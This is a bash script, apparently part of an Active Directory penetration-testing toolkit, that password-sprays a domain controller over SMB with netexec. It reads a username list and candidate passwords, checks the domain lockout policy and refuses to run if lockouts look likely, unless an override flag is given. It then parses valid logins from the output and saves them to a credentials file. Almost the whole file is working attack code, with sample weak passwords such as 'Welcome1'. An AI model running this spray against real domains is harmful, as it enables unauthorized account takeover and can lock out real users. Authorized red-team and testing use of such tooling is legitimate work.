#!/usr/bin/env bash
# =============================================================================
#  spray.sh  —  password spraying against a username list  (ATOMIC)
# =============================================================================
#  Attack-chain role: turn a username list (e.g. 02_enum_nocreds.sh's kerbrute
#  output) + a small set of candidate passwords into a valid credential, while
#  staying under the domain lockout policy.
#
#  SAFETY GATE (mandatory, before any spray): queries the lockout policy and
#  refuses if the number of passwords tried PER ACCOUNT would reach the lockout
#  threshold within the observation window. Spraying ONE password across many
#  users is safe; several passwords against the same user is what locks accounts.
#  Override with --i-know-the-risk only when you've verified the policy is safe.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
spray.sh — password spray a username list, with a lockout safety gate (ATOMIC)

USAGE:   ./spray.sh -U <userlist> (-p <pw> [-p <pw>...] | -P <pwfile>) [-t dc] [-d domain] [--i-know-the-risk]
EXAMPLE: ./spray.sh -U runs/02.../kerbrute.out -p 'Autumn2026!' -p 'Welcome1'

FLAGS:
  -U, --userlist <file>   file of confirmed usernames to spray (required)
  -p, --password <pw>     a candidate password (repeatable)
  -P, --passwords <file>  file of candidate passwords (one per line)
      --i-know-the-risk   bypass the lockout refusal (ONLY if policy is safe)
  -h, --help              this help
  (shared flags -t/-d/--dc-ip/-q: --help-common)

SAFETY: queries lockout policy (netexec --pass-pol); refuses if passwords-per-
  account would reach the lockout threshold. One password across many users is
  safe; the risk is many passwords against one user.
WHAT IT DOES: netexec smb -u <userlist> -p <pw> per password. Recovered creds
  are appended to creds.json (obtained_via "password spray").
PREREQS: a username list; DC reachable. Needs netexec.
EOF
}

USERLIST="" ; declare -a PASSWORDS=() ; PWFILE="" ; IKNOW=0

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -U|--userlist)  USERLIST="$2"; shift 2 ;;
    -p|--password)  PASSWORDS+=("$2"); shift 2 ;;
    -P|--passwords) PWFILE="$2"; shift 2 ;;
    --i-know-the-risk) IKNOW=1; shift ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
[[ -n "$USERLIST" && -f "$USERLIST" ]] || die "need a username list: -U <file> (got '${USERLIST:-none}')"
if [[ -n "$PWFILE" ]]; then
  [[ -f "$PWFILE" ]] || die "password file not found: $PWFILE"
  while IFS= read -r _p; do [[ -n "$_p" ]] && PASSWORDS+=("$_p"); done < "$PWFILE"
fi
[[ "${#PASSWORDS[@]}" -gt 0 ]] || die "no candidate passwords: use -p <pw> and/or -P <file>"

# Track every candidate password for redaction before anything is logged.
for _p in "${PASSWORDS[@]}"; do secret_track "$_p"; done

log_begin
need_cmd netexec
DOMAIN="$(resolve_domain)"
ATTEMPTS=${#PASSWORDS[@]}
log_info "spraying ${ATTEMPTS} password(s) across $(grep -cvE '^\s*$' "$USERLIST") user(s) on ${DC}"

# --- SAFETY GATE ----------------------------------------------------------
# Read the lockout policy (anonymous; fall back to a stored cred if anon fails).
run_cmd "netexec smb ${DC} -u '' -p '' --pass-pol"
POL="$LAST_OUTPUT"
if ! grep -qi 'lockout' <<<"$POL" && creds_select "$DOMAIN" 2>/dev/null; then
  run_cmd "netexec smb ${DC} $(nxc_auth) --pass-pol"; POL="$LAST_OUTPUT"
fi
if grep -qi 'lockout' <<<"$POL"; then
  spray_safe_or_die "$ATTEMPTS" "$POL" "$IKNOW"
elif [[ "$ATTEMPTS" -le 1 ]]; then
  log_info "could not read lockout policy, but only 1 password/account → safe"
elif [[ "$IKNOW" -eq 1 ]]; then
  log_warn "lockout policy unreadable; ${ATTEMPTS}/account — proceeding due to --i-know-the-risk"
else
  die "REFUSING: could not read the lockout policy from ${DC} and ${ATTEMPTS} passwords/account would be tried. Verify the policy, then re-run with --i-know-the-risk."
fi

# --- SPRAY ----------------------------------------------------------------
found=0
for pw in "${PASSWORDS[@]}"; do
  run_cmd "netexec smb ${DC} -u $(printf '%q' "$USERLIST") -p $(printf '%q' "$pw") --continue-on-success"
  if grep -qi 'STATUS_ACCOUNT_LOCKED_OUT' <<<"$LAST_OUTPUT"; then
    log_err "lockouts observed (STATUS_ACCOUNT_LOCKED_OUT) — stopping immediately"
    break
  fi
  # netexec prints valid creds as: SMB <host> 445 <NAME> [+] domain\\user:pass [(Pwn3d!)]
  while IFS= read -r l; do
    [[ "$l" == *'[+]'* ]] || continue
    pair="${l#*\[+\] }"; pair="${pair%% (*}"      # domain\user:pass (drop trailing " (Pwn3d!)")
    left="${pair%%:*}"                             # domain\user
    usr="${left##*\\}"; dom="${left%%\\*}"; [[ "$dom" == "$left" ]] && dom="$DOMAIN"
    [[ -z "$usr" ]] && continue
    creds_add "${dom:-$DOMAIN}" "$usr" "password" "$pw" "password spray, $(date '+%F')"
    found=$((found+1))
  done <<< "$LAST_OUTPUT"
done

[[ "$found" -gt 0 ]] && log_ok "spray recovered ${found} credential(s) → creds.json" \
                      || log_warn "no valid credentials from this spray"
log_end "success"
